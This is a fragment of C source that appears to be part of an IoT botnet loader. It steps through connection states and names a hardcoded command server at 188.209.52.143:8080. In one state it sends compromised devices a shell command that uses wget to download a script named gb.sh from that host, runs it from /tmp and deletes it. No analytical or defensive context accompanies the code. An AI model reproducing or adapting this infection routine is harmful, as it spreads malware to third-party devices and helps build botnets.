...
{
        "188.209.52.143:8080" //Start the server on this port
};
        ...
        while(1)
        {
			...
			case 8:
				...
				break;
                        ...
                        case 9:
                                {
                                        if(send(fds[i].fd, "wget http://188.209.52.143/gb.sh -O /tmp/gb.sh && sh /tmp/gb.sh && rm /tmp/gb.sh\r\n", 82, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 10;
                                }
                                break;
